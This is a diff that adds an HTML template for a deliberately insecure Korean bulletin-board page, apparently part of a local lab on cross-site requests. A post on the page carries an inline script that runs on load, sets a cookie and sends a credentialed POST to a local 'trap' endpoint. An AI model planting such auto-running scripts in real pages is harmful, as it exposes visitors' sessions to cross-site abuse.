@@ -1,0 +1,51 @@
+{{ define "victim-community.html" }}
+
+<!DOCTYPE html>
+<html lang="ko">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>보안 허술 게시판</title>
+  </head>
+  <body>
+    <div>게시글 본문</div>
+    <div>제목: 이 글 보면 좋은 일 생김</div>
+    <div>
+      내용: 없음
+      <script type="text/javascript">
+        {{/* const baseURL = "http://127.0.0.1:8889"; */}}
+        const baseURL = "http://localhost:8889";
+        const testURL = `${baseURL}/trap`;
+
+        function setCookie() {
+          // 참고 : https://cofs.tistory.com/363
+          var date = new Date();
+          date.setTime(date.getTime() + 60 * 60 * 24 * 1000);
+          document.cookie = `auth=1; expires=' + ${date.toUTCString()}; path=/`;
+        }
+
+        function testPost() {
+          setCookie();
+
+          fetch(testURL, {
+            method: "POST",
+            headers: {
+              Authorization: "Bearer auth2",
+            },
+            credentials: "include",
+          })
+            .then((response) => response.json())
+            .then((responseJson) =>
+              console.log("Response", JSON.stringify(responseJson))
+            )
+            .catch((error) => console.log("Error", error));
+        }
+
+        testPost();
+      </script>
+    </div>
+  </body>
+</html>
+
+{{ end }}
